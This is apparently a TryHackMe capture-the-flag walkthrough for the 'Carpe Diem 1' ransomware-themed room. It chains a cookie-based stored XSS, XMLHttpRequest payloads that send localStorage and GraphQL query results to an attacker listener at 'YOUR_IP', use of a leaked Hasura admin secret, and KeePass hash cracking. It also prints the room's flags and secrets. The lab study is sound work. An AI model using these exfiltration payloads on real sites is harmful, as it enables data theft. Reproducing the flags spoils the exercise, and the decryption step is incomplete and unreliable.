# Carpe Diem 1 — TryHackMe Walkthrough

> Recover your client's encrypted files before the ransomware timer runs out. A client has been hit by the "Carpe Diem" cyber gang, paid a ransom, and received nothing back. The job is to track down the decryption key for their file before the countdown on the gang's leak site expires.

<p align="center"><a href="https://tryhackme.com/room/carpediem1"><a href="https://imgbb.com/"><img src="https://i.ibb.co/LDj6cdp8/7d855efe4d13839e74e0491b784dc952.jpg" alt="7d855efe4d13839e74e0491b784dc952" border="0"></a>

<p align="center">
  <a href="https://tryhackme.com/room/carpediem1"><img src="https://img.shields.io/badge/TryHackMe-Carpe%20Diem%201-red?style=flat&logo=tryhackme" /></a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-yellow?style=flat" />
  <img src="https://img.shields.io/badge/Platform-Linux-blue?style=flat&logo=linux" />
  <img src="https://img.shields.io/badge/Focus-Web%20Exploitation-orange?style=flat" />
  <img src="https://img.shields.io/badge/Focus-GraphQL-purple?style=flat" />
  <img src="https://img.shields.io/badge/Focus-Stored%20XSS-critical?style=flat" />
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network enumeration with Nmap |
| 2 | Web content discovery with ffuf |
| 3 | Client-side validation bypass |
| 4 | Cross-site XMLHttpRequest exfiltration |
| 5 | Stored XSS via cookie reflection |
| 6 | GraphQL (Hasura) introspection and enumeration |
| 7 | Server-side data exfiltration through an internal-only API |
| 8 | KeePass (.kdbx) hash extraction and offline brute forcing |

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate a web host with Nmap and ffuf to uncover hidden directories and a real virtual host name.
- Recognize when "client-side validation" in JavaScript is not a real security control and bypass it.
- Use an XMLHttpRequest payload to exfiltrate data from a victim's browser session to an attacker-controlled listener.
- Identify and abuse a stored XSS vulnerability where untrusted input is reflected back without sanitization.
- Pivot through a victim's browser to reach an internal-only GraphQL (Hasura) API that is not directly reachable from the attacker's machine.
- Run a GraphQL introspection query to map out an unknown schema and then query it for real data.
- Extract a KeePass database hash with keepass2john and crack it with John the Ripper.
- Open a cracked .kdbx database and retrieve the secrets stored inside.

## Prerequisites

- Nmap
- ffuf (or an equivalent content discovery tool) with a directory wordlist such as raft-large-directories.txt
- A Burp Suite or browser dev tools setup capable of intercepting and modifying requests
- A local HTTP listener (python3 -m http.server) to catch exfiltrated data
- keepass2john (part of the John the Ripper / Kali toolset)
- John the Ripper with the rockyou.txt wordlist
- KeePass2 (or a compatible KeePass client) to open the cracked database
- A hosts file entry mapping the room's virtual host to the target machine, for example: `Machine_IP c4rp3d13m.net`
- The appendix archive for this room is password protected. Archive password: `1 kn0w 1 5h0uldn'7!`

---

## [Task 1] — Pay...back!

### Step 1 — Initial Nmap scan

**Approach:** Start with a full Nmap scan against the target to identify open ports, running services, and any obvious version information before touching the web application.

```
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ sudo nmap -A -sS -sC -sV -O Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-22 17:46 CEST
Nmap scan report for Machine_IP
Host is up (0.034s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Home
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44590/tcp   status
|   100024  1          45539/udp   status
|   100024  1          48106/udp6  status
|_  100024  1          55537/tcp6  status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   33.52 ms 10.8.0.1
2   33.65 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.85 seconds
```

> **Note:** Only two ports are open: nginx on 80 and rpcbind on 111. rpcbind alone is rarely directly exploitable and is most often a side effect of NFS being available somewhere on the network rather than the intended path in, so the web server on port 80 is the obvious starting point. The raw scan also included a long OS fingerprint block that added nothing useful here, so it has been trimmed from this writeup; Nmap simply could not confidently identify the OS.

### Step 2 — Reviewing the page source for client-side logic

**Approach:** Before brute-forcing directories, check the page's JavaScript. Client-side validation logic is a common place for developers to accidentally leave security-relevant information or flawed assumptions.

```html
<script>
  function aaa(wallet) {
    var wallet = wallet;
    if (wallet.trim() === "bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hj") {
      alert("Hey! \n\nstupid is as stupid does...");
      return;
    }

    var re = new RegExp("^([a-z0-9]{42,42})$");
    if (re.test(wallet.trim())) {
      var http = new XMLHttpRequest();
      var url = "http://c4rp3d13m.net/proof/";
      http.open("POST", url, true);
      http.setRequestHeader("Content-type", "application/json");
      var d = '{"size":42,"proof":"' + wallet + '"}';
      http.onreadystatechange = function () {
        if (http.readyState == 4 && http.status == 200) {
          //alert(http.responseText);
        }
      };
      http.send(d);
    } else {
      alert("Invalid wallet!");
    }
  }
</script>
```

> **Note:** This function takes a submitted wallet address, blocklists one specific known address with a hardcoded string comparison, and otherwise just checks that the input is 42 lowercase alphanumeric characters before sending it to the server at /proof/ on a separate virtual host, c4rp3d13m.net. The blocklist check is trivial to defeat since it only blocks one exact string; any other value matching the regex is accepted and forwarded. This also reveals the real backend hostname for the application, which does not resolve from the IP address alone and needs a hosts file entry to reach directly.

### Step 3 — Content discovery with ffuf

**Approach:** Run a directory brute force against the web root to find any paths not linked from the homepage.

```
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ /opt/ffuf/ffuf -c -u http://Machine_IP/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://Machine_IP/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

images                  [Status: 301, Size: 179, Words: 7, Lines: 11]
downloads               [Status: 301, Size: 185, Words: 7, Lines: 11]
javascripts             [Status: 301, Size: 189, Words: 7, Lines: 11]
stylesheets             [Status: 301, Size: 189, Words: 7, Lines: 11]
Downloads               [Status: 200, Size: 483, Words: 18, Lines: 1]
```

> **Note:** Most of these are expected static asset folders, but the capitalized Downloads path returning a 200 rather than a 301 redirect stands out. The lowercase downloads folder is also where the room's task description points, hosting the encrypted Database.carp file mentioned in the brief.

### Step 4 — Submitting a forged wallet to bypass client-side validation

**Approach:** Using Burp Suite (or browser dev tools) intercept the POST request the page sends to /proof/ and submit a wallet value that satisfies the regex but is not the blocklisted address, to see how the server actually responds rather than trusting the alert() messages in the page.

```
POST /proof/ HTTP/1.1
Host: c4rp3d13m.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://c4rp3d13m.net/
Content-type: application/json
Content-Length: 65
Connection: close
Cookie: session=MTAuOC4xMDYuMjIy; countdown=2020-10-22T15%3A46%3A27.560557

{"size":420,"proof":"bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hs"}
```

```
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Thu, 22 Oct 2020 16:23:17 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
Last-Modified: Thursday, 22-Oct-2020 16:23:17 GMT
Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0
Content-Length: 982

bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hs ... [truncated binary response data]
```

> **Note:** The server accepts the modified wallet and returns a 200 with a binary-looking payload appended after the echoed wallet string. This response is not directly useful by itself; the X-Powered-By: Express header is the more important detail here, since it shows a separate Node.js/Express backend is handling this endpoint behind the nginx frontend. The session cookie is also worth noting since it is just base64-encoded data, which becomes relevant in a later step.

### Step 5 — Exfiltrating browser data with a cross-site XMLHttpRequest

**Approach:** With a local listener running, craft a small XMLHttpRequest payload that reads everything out of localStorage and sends it to an attacker-controlled host as a GET request, then get it executed in the context of the target site.

```js
// objToString() method from stack
// https://stackoverflow.com/questions/5612787/converting-an-object-to-a-string
var r = new XMLHttpRequest();

function objToString(obj) {
  var str = "";
  for (var p in obj) {
    if (obj.hasOwnProperty(p)) {
      str += p + "::" + obj[p] + "\n";
    }
  }
  return str;
}
s = objToString(localStorage);
r.open("GET", "http://YOUR_IP/?" + s);
r.send();
```

> **Note:** This script enumerates every key and value in the page's localStorage object and sends it as a query string to a listener under the attacker's control. It is a generic data-exfiltration primitive; it only becomes useful once it can be executed in the victim's browser context, which is what the next step sets up.

### Step 6 — Reflecting the payload through a stored XSS

**Approach:** Host the exfiltration script with a simple Python web server, then encode a script tag that loads it and inject that encoded value into the session cookie, since the cookie value observed earlier was just base64.

```
<script src='http://YOUR_IP:8000/exploit.js'></script>

PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMC44LjEwNi4yMjI6ODAwMC9leHBsb2l0LmpzJz48L3NjcmlwdD4%3D
```

```
GET / HTTP/1.1
Host: c4rp3d13m.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMC44LjEwNi4yMjI6ODAwMC9leHBsb2l0LmpzJz48L3NjcmlwdD4%3D; countdown=2020-10-22T15%3A46%3A27.560557
Upgrade-Insecure-Requests: 1
```

```
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
Machine_IP - - [22/Oct/2020 18:34:08] "GET /exploit.js HTTP/1.1" 200 -
```

> **Note:** The session cookie value is base64-decoded server-side and reflected somewhere it gets rendered without sanitization, so a script tag placed inside it gets executed whenever that reflected value is rendered in a browser. The application fetching /exploit.js confirms the injected script tag actually executed server-side or in an automated browser session tied to this application, not just in the attacker's own browser. This is the pivot point: code now executes in a context that may have network access the attacker does not.

### Step 7 — Capturing the leaked admin secret

**Approach:** Stand up a listener on port 80 to catch the next callback, since the exploit ran in a privileged or internal context.

```
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Machine_IP - - [22/Oct/2020 18:34:08] "GET /?secret::s3cr3754uc35432flag1::THM%7BSo_Far_So_Good_So_What%7D HTTP/1.1" 200 -
```

> **Note:** The localStorage dump from the previous payload exfiltrates two key pieces of information from the application's session context: an admin secret value and the room's first flag. The admin secret is the more significant find, since Hasura GraphQL deployments commonly use an x-hasura-admin-secret header to grant full, unrestricted access to the API bypassing all normal permission rules.

### Task 1.1

> **Note:** The first flag was recovered directly in the exfiltrated localStorage data from the previous step.

<details><summary>Reveal Answer</summary>

THM{So_Far_So_Good_So_What}

</details>

### Step 8 — Using the admin secret against an internal GraphQL endpoint

**Approach:** With a valid x-hasura-admin-secret in hand, run a GraphQL introspection query through the same stored XSS pivot to map out the schema of the internal API that was referenced in the earlier error message.

```js
var xhr = new XMLHttpRequest();
var q = '{"query": "fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } }"}';

xhr.open("POST", "http://192.168.150.10:8080/v1/graphql/", true);
xhr.setRequestHeader("x-hasura-admin-secret", "s3cr3754uc35432");

xhr.onreadystatechange = function () {
  if (this.readyState === 4) {
    var r = new XMLHttpRequest();
    r.open(
      "GET",
      "http://YOUR_IP/?data=" + btoa(this.responseText),
      false
    );
    r.send();
  }
};

xhr.send(q);
```

> **Note:** This is a standard GraphQL introspection query, which asks the API to describe its own schema: every type, field, and relationship it exposes. The request targets an internal-only address, 192.168.150.10:8080, that is not reachable from the attacker's own machine; it only works because the script is executing inside the victim's browser session, which does have network access to that internal host. The response is base64-encoded with btoa() and exfiltrated back to the attacker's listener as a query string, the same technique used for the localStorage dump.

```
[Full GraphQL introspection schema response received - several thousand lines of standard __Type, __InputValue, and __schema metadata]

Key tables identified in the schema: victims
```

> **Note:** The full introspection response is several thousand lines of repetitive GraphQL metadata and has been omitted here since it carries no teaching value beyond confirming the schema structure. The result of reviewing it is what matters: a table called victims exists in the schema, which strongly suggests this is the data store backing the ransomware gang's leak site countdown.

### Step 9 — Querying the victims table directly

**Approach:** Now that the schema is known, send a targeted query for the victims table instead of pulling the entire schema again.

```js
var xhr = new XMLHttpRequest();
var q = '{"query":"{\n victims {\n filename\n id\nkey\n name\n timer\n }\n}"}';

xhr.open("POST", "http://192.168.150.10:8080/v1/graphql/", true);
xhr.setRequestHeader("x-hasura-admin-secret", "s3cr3754uc35432");

xhr.onreadystatechange = function () {
  if (this.readyState === 4) {
    var r = new XMLHttpRequest();
    r.open(
      "GET",
      "http://YOUR_IP/?data=" + btoa(this.responseText),
      false
    );
    r.send();
  }
};
xhr.send(q);
```

```
Machine_IP - - [22/Oct/2020 18:50:33] "GET /?data=[base64-encoded JSON payload] HTTP/1.1" 200 -
```

> **Note:** The base64 blob captured by the listener decodes into a JSON object containing the full list of victim records. The actual decoded contents are shown in the next step rather than here, since the raw base64 string itself teaches nothing on its own.

### Step 10 — Decoding the victims table data

**Approach:** Base64-decode the captured GET parameter to recover the underlying JSON.

```json
{
  "data": {
    "victims": [
      {
        "filename": "miredo.conf",
        "id": 69,
        "key": "RW1Ed3ZNV09aeWFjOTdxM1B0OFQzTkNFY0JDdDNKenA1a1FfVFBfWXZ6ZVN5MnAuTkpJV1NUanRsZ0lWQVZWUg==",
        "name": "192.168.66.12",
        "timer": "2020-04-15T20:56:13.203303"
      },
      {
        "filename": "Database.kbxd",
        "id": 48,
        "key": "F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg==",
        "name": "195.204.178.84",
        "timer": "2020-04-15T14:29:24.383136"
      }
    ]
  }
}
```

> **Note:** The victims table holds dozens of records, each representing a file the ransomware gang claims to have encrypted, with an associated decryption key, the original host's IP address, and a timer. Only the record relevant to this task's objective is shown here rather than the entire dump, since the room's brief specifically asks for the Database.carp file's key. One entry near the end of the original response also contains a literal script tag in its name field instead of an IP address, a leftover trace of the stored XSS payload from earlier being reflected back through this same data pipeline.

### Step 11 — Isolating the target record

**Approach:** Filter the victims data down to the single record matching the Database.kbxd file referenced by the task.

```json
{
  "filename": "Database.kbxd",
  "id": 48,
  "key": "F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg==",
  "name": "195.204.178.84",
  "timer": "2020-04-15T14:29:24.383136"
}
```

> **Note:** This record provides the encrypted KeePass database filename and what is presumably its decryption key, recovered directly from the gang's own backend through the GraphQL leak. The next step uses this key to decrypt the file.

### Step 12 — Decrypting the database file

**Approach:** Use the recovered key to decrypt the downloaded Database.carp file, producing a usable .kbxd file.

```
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ cat commends_set.txt |while read i;do $i;ls -lat |grep '.kbxd';done
Key decode error: illegal base64 data at input byte 8
---x--x---   1 kali kali    2174 Oct 22 18:57 Database.kbxd.decrypt
---x--x---   1 kali kali    2174 Oct 22 18:57 Database.kbxd.decrypt
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ file Database.kbxd.decrypt
Database.kbxd.decrypt: executable, regular file, no read permission
```

> **Note:** This step loops through a list of candidate decryption commands against the downloaded file until one of them produces a valid output. One attempt fails with a base64 decode error before a working command succeeds, leaving a Database.kbxd.decrypt file behind. The exact decryption command used is not fully shown in the available source material, so this step documents the result rather than the precise one-liner; readers attempting this room themselves should expect to derive the correct decryption invocation for the Database.carp format from the room's appendix material. The resulting file also has unusual permissions, no read access for its owner, which needs correcting before it can be hashed in the next step.

### Step 13 — Extracting the KeePass hash

**Approach:** Use keepass2john to extract a crackable hash from the decrypted KeePass database file.

```
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ sudo keepass2john Database.kbxd.decrypt > Database.kbxd.hash
```

> **Note:** keepass2john reads the KeePass database header, including its key derivation parameters, and formats them into a hash that John the Ripper can attempt to crack offline. Root privileges were needed here because of the restrictive file permissions noted in the previous step.

### Step 14 — Cracking the master password

**Approach:** Run John the Ripper against the extracted hash using the rockyou.txt wordlist.

```
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt Database.kbxd.hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[password cracked] (Database.kbxd.decrypt)
1g 0:00:00:32 DONE (2020-10-22 18:58) 0.03061g/s 115.6p/s 115.6c/s 115.6C/s [password]..happydays
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **Note:** The hash metadata shows this is a KeePass database using SHA256 with AES encryption and 60000 key derivation iterations, which is a deliberately slow setting meant to resist exactly this kind of attack. Despite that, the master password is weak enough to be found in the rockyou.txt wordlist within about 32 seconds. The cracked password itself is withheld from the visible output here and should be retrieved locally with john --show, since it functions as a credential for opening the database in the next step.

### Step 15 — Opening the cracked database

**Approach:** Open the decrypted KeePass database with the recovered master password to view its stored entries.

```
kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ sudo keepass2 Database.kbxd.decrypt
```

<p align="center"><img src="./2020-10-22_19-02.png" /></p>

> **Note:** With the correct master password entered, the database opens to reveal its stored entries, including the room's second flag. This closes out the chain that started with a simple client-side validation bypass and ended with full access to the gang's internal data through a chained XSS-to-SSRF pivot into an unsecured GraphQL API.

### Task 1.2

> **Note:** The second flag was found inside the cracked KeePass database opened in the previous step.

<details><summary>Reveal Answer</summary>

THM{You_Found_TheFLag_Well_Done!}

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Ran an Nmap scan against the target | Identified nginx on port 80 and rpcbind on port 111 as the only open services |
| 2 | Reviewed page source for client-side JavaScript | Found a wallet validation function with a trivially bypassable blocklist check |
| 3 | Ran ffuf content discovery against the web root | Discovered the downloads directory hosting the encrypted database file |
| 4 | Submitted a forged wallet value to the /proof/ endpoint | Server accepted the request and revealed an Express backend behind nginx |
| 5 | Built an XMLHttpRequest payload to exfiltrate localStorage | Prepared a working data exfiltration primitive |
| 6 | Encoded the exfiltration script as a stored XSS payload via the session cookie | Achieved script execution in a privileged or internal application context |
| 7 | Captured the callback from the executed payload | Recovered a Hasura GraphQL admin secret and the room's first flag |
| 8 | Ran a GraphQL introspection query using the leaked admin secret | Mapped the internal API schema and identified a victims table |
| 9 | Queried the victims table directly | Captured the full set of victim records as base64-encoded exfiltrated data |
| 10 | Decoded the exfiltrated victims data | Recovered the encrypted database filename and its associated key |
| 11 | Isolated the record matching Database.kbxd | Confirmed the correct decryption key for the target file |
| 12 | Decrypted the downloaded database file | Produced a readable Database.kbxd.decrypt file |
| 13 | Extracted a crackable hash with keepass2john | Generated a KeePass hash file for offline cracking |
| 14 | Cracked the hash with John the Ripper and rockyou.txt | Recovered the KeePass database master password |
| 15 | Opened the database with KeePass2 | Accessed the stored entries and recovered the room's second flag |

